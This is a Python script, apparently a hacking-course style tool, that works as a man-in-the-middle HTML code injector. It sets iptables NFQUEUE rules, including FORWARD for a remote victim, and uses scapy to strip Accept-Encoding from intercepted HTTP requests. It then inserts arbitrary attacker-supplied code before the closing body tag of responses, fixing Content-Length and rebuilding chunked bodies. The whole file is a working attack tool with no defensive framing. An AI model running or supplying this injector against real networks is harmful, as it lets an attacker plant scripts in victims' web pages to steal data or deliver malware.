import netfilterqueue
import subprocess
from scapy.all import Raw
from scapy.layers.inet import IP, TCP
import argparse
import re
import sys
import traceback


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-m", "--machine", dest="machine", help="Machine to execute command on (local/remote)")
    parser.add_argument("-i", "--inject", dest="inject", help="Injection code to execute")
    args = parser.parse_args()

    if not args.machine or args.machine not in ["local", "remote"]:
        parser.error("[-] Invalid input; Please specify a machine; Use -h or --help for more info")
    if not args.inject:
        parser.error("[-] Invalid input; Please specify a code to inject; Use -h or --help for more info")
    return args


def set_iptables_rule(machine):
    if machine == "local":
        values = ["OUTPUT", "INPUT"]
    elif machine == "remote":
        values = ["FORWARD"]
    else:
        raise ValueError("Invalid machine type")

    for iptables_cmd in values:
        subprocess.call(["sudo", "iptables", "-I", iptables_cmd, "-j", "NFQUEUE", "--queue-num", "0"])
    print("[+] Setting iptables for {} machine".format(machine))


def set_load(packet, load):
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    packet[Raw].load = load
    return packet


def process_packets(packet):
    try:
        scapy_packet = IP(packet.get_payload())

        if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
            load = scapy_packet[Raw].load

            if scapy_packet[TCP].dport == 80:
                load = re.sub(b"(?:Accept-Encoding|Upgrade-Insecure-Requests|grade-Insecure-Requests):.*?\r\n",
                              b"", load)
                req_ack.append(scapy_packet[TCP].ack)

            elif scapy_packet[TCP].sport == 80:
                load = modify_content_length(load)
                load = modify_chunks(scapy_packet, load)

            if load != scapy_packet[Raw].load:
                modified_payload = set_load(scapy_packet, load)
                packet.set_payload(bytes(modified_payload))

    except Exception as e:
        handle_exception(e)
    finally:
        packet.accept()


def modify_content_length(load):
    if load:
        injection_code = b"\n" + arguments.inject.encode(errors="ignore") + b"\n"
        load = load.replace(b"</body>", injection_code + b"</body>")
        content_length_search = re.search(b"Content-Length:\s(\d*)", load)
        if content_length_search and b"text/html" in load:
            content_length = content_length_search.group(1)
            new_content_length = str(int(content_length) + len(injection_code)).encode(errors="ignore")
            load = load.replace(content_length, new_content_length)
            return load
        else:
            return load


def modify_chunks(packet, load):
    if packet[TCP].seq in req_ack and b'200 OK' in load and b'Transfer-Encoding: chunked' in load:
        res_ack.append(packet[TCP].ack)

    if packet[TCP].ack in res_ack:
        first_chunk_exists = re.search(b'\r\n\r\n', load)
        last_chunk_exists = re.search(b'\n\r\n0\r\n\r\n', load)

        if first_chunk_exists:
            find_chunk = load.find(b'\r\n\r\n')
            chunk_start = load[find_chunk + len(b'\r\n\r\n'):]
            chunk_data_start = chunk_start.find(b'\r\n')
            chunk_data = chunk_start[chunk_data_start + len(b'\r\n'):]
            if chunk_data not in buffer_chunks:
                buffer_chunks.append(chunk_data)

        if last_chunk_exists:
            find_chunk = load.find(b'\n\r\n0\r\n\r\n')
            chunk_data = load[:find_chunk]
            if chunk_data not in buffer_chunks:
                buffer_chunks.append(chunk_data)

        if not first_chunk_exists and not last_chunk_exists:
            if load not in buffer_chunks:
                buffer_chunks.append(load)

    buffer = b''.join(buffer_chunks)
    print(buffer)

    if b'</body>' in buffer:
        injection_code = b"\n" + arguments.inject.encode(errors="ignore") + b"\n"
        load = buffer.replace(b'</body>', injection_code + b"</body>")
        print(load)
        return load
    else:
        return load


def handle_exception(exception):
    print("\n\n[!] An error occurred: ", str(exception) + "\n\n")
    traceback.print_exc()
    print("\n\n[-] Terminating session")
    sys.exit(1)


def queue_packets():
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packets)
    print("\n[+] Starting code injector")
    set_iptables_rule(arguments.machine)
    print("[+] Code injector started successfully!\n")
    try:
        queue.run()
    except KeyboardInterrupt:
        print("\n\n[-] Closing code injector")
    finally:
        cleanup()


def cleanup():
    subprocess.call(["sudo", "iptables", "--flush"])
    print("[-] Flushing iptables")
    print("[-] Code injector ended successfully!")


buffer_chunks = []
req_ack = []
res_ack = []
arguments = get_arguments()
queue_packets()
